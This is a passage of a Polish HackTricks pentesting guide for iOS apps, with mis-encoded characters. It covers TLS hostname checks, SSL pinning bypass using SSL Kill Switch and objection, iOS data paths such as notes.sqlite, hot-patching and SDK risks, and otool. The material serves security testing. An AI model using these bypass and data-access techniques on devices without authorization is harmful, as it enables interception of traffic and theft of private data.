Powszechnym problemem przy sprawdzaniu certyfikatu TLS jest sprawdzenie, czy certyfikat zostaÅ‚ podpisany przez **zaufany** **CA**, ale **nie sprawdzenie**, czy **nazwa hosta** w certyfikacie jest tÄ… samÄ…, do ktÃ³rej siÄ™ odwoÅ‚ujemy.\
Aby sprawdziÄ‡ ten problem za pomocÄ… Burp, po zaufaniu CA Burp na iPhonie, moÅ¼na **utworzyÄ‡ nowy certyfikat z Burp dla innej nazwy hosta** i go uÅ¼yÄ‡. JeÅ›li aplikacja nadal dziaÅ‚a, to oznacza, Å¼e jest podatna na atak.

### Pinned Certificates

JeÅ›li aplikacja poprawnie korzysta z SSL Pinning, to aplikacja bÄ™dzie dziaÅ‚aÄ‡ tylko wtedy, gdy certyfikat bÄ™dzie oczekiwanym certyfikatem. Podczas testowania aplikacji **moÅ¼e to byÄ‡ problemem, poniewaÅ¼ Burp bÄ™dzie serwowaÅ‚ swÃ³j wÅ‚asny certyfikat.**\
Aby ominÄ…Ä‡ tÄ™ ochronÄ™ na urzÄ…dzeniu z jailbreakiem, moÅ¼na zainstalowaÄ‡ aplikacjÄ™ [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) lub zainstalowaÄ‡ [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

MoÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡ polecenia `ios sslpinning disable` w narzÄ™dziu **objection**.

## RÃ³Å¼ne

* W **`/System/Library`** moÅ¼na znaleÅºÄ‡ frameworki zainstalowane w telefonie, uÅ¼ywane przez aplikacje systemowe.
* Aplikacje zainstalowane przez uÅ¼ytkownika ze sklepu App Store znajdujÄ… siÄ™ w folderze **`/User/Applications`**.
* Natomiast **`/User/Library`** zawiera dane zapisane przez aplikacje na poziomie uÅ¼ytkownika.
* MoÅ¼na uzyskaÄ‡ dostÄ™p do pliku **`/User/Library/Notes/notes.sqlite`**, aby odczytaÄ‡ zapisane w aplikacji notatki.
* WewnÄ…trz folderu z zainstalowanÄ… aplikacjÄ… (**`/User/Applications/<APP ID>/`**) moÅ¼na znaleÅºÄ‡ kilka interesujÄ…cych plikÃ³w:
* **`iTunesArtwork`**: Ikona uÅ¼ywana przez aplikacjÄ™.
* **`iTunesMetadata.plist`**: Informacje o aplikacji uÅ¼ywane w App Store.
* **`/Library/*`**: Zawiera preferencje i pamiÄ™Ä‡ podrÄ™cznÄ…. W folderze **`/Library/Cache/Snapshots/*`** moÅ¼na znaleÅºÄ‡ zrzut wykonany z aplikacji przed wysÅ‚aniem jej do tÅ‚a.

### Hot Patching/Enforced Updateing

Deweloperzy mogÄ… zdalnie **poprawiaÄ‡ wszystkie instalacje swojej aplikacji natychmiast**, bez koniecznoÅ›ci ponownego przesyÅ‚ania aplikacji do sklepu App Store i oczekiwania na zatwierdzenie.\
W tym celu zazwyczaj uÅ¼ywa siÄ™ [**JSPatch**](https://github.com/bang590/JSPatch)**.** IstniejÄ… jednak rÃ³wnieÅ¼ inne opcje, takie jak [Siren](https://github.com/ArtSabintsev/Siren) i [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Jest to niebezpieczny mechanizm, ktÃ³ry moÅ¼e byÄ‡ naduÅ¼ywany przez zÅ‚oÅ›liwe SDK osÃ³b trzecich, dlatego zaleca siÄ™ sprawdzenie, jakie metody sÄ… uÅ¼ywane do automatycznego aktualizowania (jeÅ›li takie istniejÄ…) i przetestowanie ich.** MoÅ¼na sprÃ³bowaÄ‡ pobraÄ‡ poprzedniÄ… wersjÄ™ aplikacji w tym celu.

### Osoby trzecie

PowaÅ¼nym wyzwaniem zwiÄ…zanym z **SDK osÃ³b trzecich** jest **brak precyzyjnej kontroli** nad ich funkcjonalnoÅ›ciami. Deweloperzy stojÄ… przed wyborem: zintegrowaÄ‡ SDK i zaakceptowaÄ‡ wszystkie jego funkcje, w tym potencjalne podatnoÅ›ci na bezpieczeÅ„stwo i problemy z prywatnoÅ›ciÄ…, lub caÅ‚kowicie zrezygnowaÄ‡ z jego korzyÅ›ci. CzÄ™sto deweloperzy nie sÄ… w stanie samodzielnie naprawiÄ‡ podatnoÅ›ci w tych SDK. Ponadto, gdy SDK zyskujÄ… zaufanie w spoÅ‚ecznoÅ›ci, niektÃ³re z nich mogÄ… zawieraÄ‡ zÅ‚oÅ›liwe oprogramowanie.

UsÅ‚ugi Å›wiadczone przez SDK osÃ³b trzecich mogÄ… obejmowaÄ‡ Å›ledzenie zachowaÅ„ uÅ¼ytkownikÃ³w, wyÅ›wietlanie reklam lub ulepszanie doÅ›wiadczenia uÅ¼ytkownika. Jednak wiÄ…Å¼e siÄ™ to z ryzykiem, poniewaÅ¼ deweloperzy mogÄ… nie byÄ‡ w peÅ‚ni Å›wiadomi kodu wykonywanego przez te biblioteki, co prowadzi do potencjalnych zagroÅ¼eÅ„ dla prywatnoÅ›ci i bezpieczeÅ„stwa. WaÅ¼ne jest ograniczenie informacji udostÄ™pnianych usÅ‚ugom osÃ³b trzecich do tego, co jest niezbÄ™dne, i zapewnienie, Å¼e Å¼adne wraÅ¼liwe dane nie sÄ… ujawniane.

Implementacja usÅ‚ug osÃ³b trzecich zazwyczaj przyjmuje dwie formy: samodzielnej biblioteki lub peÅ‚nego SDK. Aby chroniÄ‡ prywatnoÅ›Ä‡ uÅ¼ytkownika, wszelkie dane udostÄ™pniane tym usÅ‚ugom powinny byÄ‡ **anonimizowane**, aby zapobiec ujawnieniu danych identyfikujÄ…cych osobÄ™ (PII).

Aby zidentyfikowaÄ‡ biblioteki uÅ¼ywane przez aplikacjÄ™, moÅ¼na uÅ¼yÄ‡ polecenia **`otool`**. NarzÄ™dzie to powinno byÄ‡ uruchamiane dla aplikacji i kaÅ¼dej uÅ¼ywanej przez niÄ… biblioteki wspÃ³Å‚dzielonej, aby odkryÄ‡ dodatkowe biblioteki.
```bash
otool -L <application_path>
```
## **OdnoÅ›niki i wiÄ™cej zasobÃ³w**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) BezpÅ‚atny kurs iOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Wersja Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Wersja Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
ZdobÄ…dÅº dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
